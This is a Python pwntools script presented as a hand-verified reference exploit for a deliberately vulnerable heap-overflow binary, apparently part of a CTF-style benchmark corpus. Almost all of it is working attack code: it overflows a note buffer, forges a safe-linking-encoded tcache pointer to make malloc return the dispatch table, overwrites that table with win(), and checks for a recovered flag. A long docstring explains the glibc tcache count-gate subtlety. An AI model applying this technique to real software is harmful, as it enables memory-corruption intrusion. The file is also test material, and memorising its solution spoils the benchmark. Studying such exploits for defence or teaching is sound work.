#!/usr/bin/env python3
"""Hand-verified reference exploit for corpus_r2/11_heap_overflow_tcache_poison.

Technique: heap buffer overflow (fill_note only bounds len against a fixed
0x400 ceiling, never against the note's own allocated size) used to corrupt
a FREED neighboring chunk's tcache `next` pointer (safe-linking encoded,
glibc >= 2.32), poisoning the tcache free-list so a later malloc() returns
an attacker-chosen address: &dispatch_table. A final fill() then overwrites
dispatch_table[0] with win()'s address, and call_handler(0) invokes it.

Chunk layout math (all requests use size 0x18, glibc chunk size 0x20,
usable 0x18):
    mem_A .. mem_A+0x17   A's own usable bytes (arbitrary filler)
    mem_A+0x18 .. +0x1F   B's chunk "size" field (harmless if not 0x21 --
                          tcache_get() never re-validates it)
    mem_A+0x20 .. +0x27   B's chunk "fd"/"next" field == mem_B itself
                          (since B is free, tcache stores its safe-linking
                          -encoded next pointer here)

Safe-linking: PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr, where pos is the
address holding the encoded pointer (== mem_B here). We forge next such
that decoding it yields &dispatch_table.

COUNT-GATE SUBTLETY (this is why a 2-chunk version of this exploit does
NOT work, discovered empirically): tcache_get() unconditionally decrements
tcache->counts[tc_idx] on every pop and gates the *next* call on that count
being > 0 -- regardless of whether the popped entry was legitimate. If you
free only B and poison it directly, the pop that decodes the poison to
&dispatch_table ALSO drops the count to 0, so the very next malloc() can't
reach the tcache fast path to retrieve it. The fix is a THIRD chunk C, of
the same size class, freed *before* B so count=2 at the moment of the
first pop: free(C) [count 0->1], free(B) [count 1->2, B becomes head].
Overflowing A into B's fd then poisons the *head* itself, so: pop #1
(count 2->1, still >0) returns B and decodes B's own forged fd into
&dispatch_table as the new head; pop #2 (count 1->0, but the check ran
while count was still 1) returns &dispatch_table directly.

win() is reached via a genuine indirect `call *dispatch_table[idx]`
instruction (not a ret-based hijack), so unlike several other targets in
this corpus, no ABI stack-alignment fixup is required here.
"""
import os
import sys

from pwn import ELF, context, p64, process

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "corpus_r2", "11_heap_overflow_tcache_poison",
                    "heap_overflow_tcache_poison")

context.log_level = "error"
context.arch = "amd64"


def protect_ptr(pos: int, ptr: int) -> int:
    return (pos >> 12) ^ ptr


def create(io, idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.recvuntil(f"chunk[{idx}] @ ".encode())
    addr = int(io.recvline().strip(), 16)
    io.recvuntil(b"ok\n")
    return addr


def fill(io, idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"len: ", str(len(data)).encode())
    io.sendlineafter(b"data: ", data)
    io.recvuntil(b"ok\n")


def delete(io, idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"ok\n")


def call_handler(io, idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", str(idx).encode())


def main():
    elf = ELF(BIN, checksec=False)
    win_addr = elf.symbols["win"]
    dispatch_table = elf.symbols["dispatch_table"]

    io = process(BIN, cwd=os.path.dirname(BIN))

    mem_a = create(io, 0, 0x18)  # A: overflow source
    mem_b = create(io, 1, 0x18)  # B: adjacent to A; becomes the poisoned head
    create(io, 2, 0x18)          # C: filler, freed first purely to keep count>0

    delete(io, 2)  # count 0->1
    delete(io, 1)  # count 1->2, B is now head -- REQUIRED (see ablation.py)

    poison = protect_ptr(mem_b, dispatch_table)
    payload = b"A" * 0x18 + p64(0x21) + p64(poison)
    fill(io, 0, payload)  # overflow A into B's chunk header + fd field

    create(io, 3, 0x18)  # pops B; tcache head becomes &dispatch_table
    create(io, 4, 0x18)  # pops &dispatch_table itself

    fill(io, 4, p64(win_addr))  # dispatch_table[0] = win

    call_handler(io, 0)

    out = io.recvall(timeout=3).decode(errors="replace")
    io.close()

    flag_file = os.path.join(HERE, "..", "corpus_r2", "11_heap_overflow_tcache_poison",
                              "flag.txt")
    with open(flag_file) as f:
        expected = f.read().strip()

    if expected in out:
        print(f"[+] PASS: flag recovered: {expected}")
        return 0
    print("[-] FAIL: flag not found in output")
    print(out)
    return 1


if __name__ == "__main__":
    sys.exit(main())
